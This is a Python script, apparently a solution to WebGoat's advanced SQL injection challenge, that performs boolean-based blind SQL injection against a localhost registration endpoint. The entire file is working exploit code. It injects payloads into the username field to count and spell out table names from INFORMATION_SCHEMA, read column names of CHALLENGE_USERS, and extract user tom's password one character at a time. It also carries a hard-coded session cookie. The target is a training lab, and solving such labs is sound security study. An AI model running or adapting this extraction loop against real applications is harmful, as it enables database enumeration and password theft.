import requests
jsession={'JSESSIONID':"ax0iIFMFXQSIrCnn5imneHLlJg1uX92qk9a0dAku"}

def table(i,length):
    table_name=""
    for j in range(length):
        alphabets="ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'"
        iter=0
        
        while(1):
            username="tom' and (select substring(table_name,"+str(j+1)+",1) from (select table_name from INFORMATION_SCHEMA.tables limit 1 offset "+str(i)+"))='"+str(alphabets[iter])
            params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}                 
            response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
            data=response.json()
            
            if 'already exists' in data['feedback']:
                table_name= table_name+ str(alphabets[iter])
                break
            else:
                iter=iter+1    
    return table_name

def getTableNames():
    table_names=[]
    count=0
    #getting total number of tables
    while(1):
        username="tom' and (select count(*) from INFORMATION_SCHEMA.tables)="+str(count)+"--"
        params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}        
        response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
        data=response.json()
        # print(data)
        if 'already exists' in data['feedback']:
            print("Total Number of Tables is:",count)
            break
        else:
            count=count+1   
    for i in range(count):
        table_length=1
        while(1):

            username="tom' and (select length(table_name) from (select table_name from INFORMATION_SCHEMA.tables limit 1 offset "+str(i)+"))="+str(table_length)+"--"
            params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'} 
            
            response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
            data=response.json()
            
            if 'already exists' in data['feedback']:
                name=table(i,table_length)
                print(str(i) , name)
                table_names.append(name)
                break
            else:
                table_length=table_length+1
    print(table_names)
    return table_names
getTableNames()

def col(i,length):
    column_letters=""
    for j in range(length):
        alphabets="ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'"
        iter=0
        while(1):
            username="tom' and (select substring(column_name,"+str(j+1)+",1) from (select column_name from INFORMATION_SCHEMA.columns where table_name='CHALLENGE_USERS' limit 1 offset "+str(i)+"))='"+str(alphabets[iter])
            params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}                
           
            response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
            data=response.json()                
            if 'already exists' in data['feedback']:
                column_letters= column_letters+ str(alphabets[iter])
                print("Column "+ str(i)+" name is",column_letters)
                break
            else:
                iter=iter+1   
    return column_letters
def getColumnNames():
    columns=[]
    for i in range(3):
        length=1
        while(1):

            username="tom' and (select length(column_name) from (select column_name from INFORMATION_SCHEMA.columns where table_name='CHALLENGE_USERS' limit 1 offset "+str(i)+"))="+str(length)+"--"
            params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}                

            
            response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
            data=response.json()
            
            if 'already exists' in data['feedback']:
                columnname=col(i,length)
                columns.append(columnname)
                break
            else:
                length=length+1
    print(columns)
    return columns,
getColumnNames()

def get_password(password_length):
    password=""
    for j in range(password_length):
        alphabets="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'"
        iter=0
        
        while(1):
            username="tom' and (select substring(PASSWORD,"+str(j+1)+",1) from CHALLENGE_USERS WHERE USERID='tom')='"+str(alphabets[iter])
            params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}                
            response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
            data=response.json()
            
            if 'already exists' in data['feedback']:
                password = password+ str(alphabets[iter])
                print("Password",password)
                break
            else:
                iter=iter+1  
    return password


def get_password_length():
    password_length=1
    while(1):
        username="tom' and (select length(PASSWORD) from CHALLENGE_USERS where USERID='tom')="+str(password_length)+"--"
        params={'username_reg':username,'email_reg':'akhi@gmail.com','password_reg':'hello123','confirm_password_reg':'hello123'}                
            
        response=requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge',params=params,cookies=jsession)
        data=response.json()
            
        if 'already exists' in data['feedback']:
            print("The Length of the password is: ",password_length)
            password=get_password(password_length)
            break
        else:
            password_length=password_length+1

get_password_length()



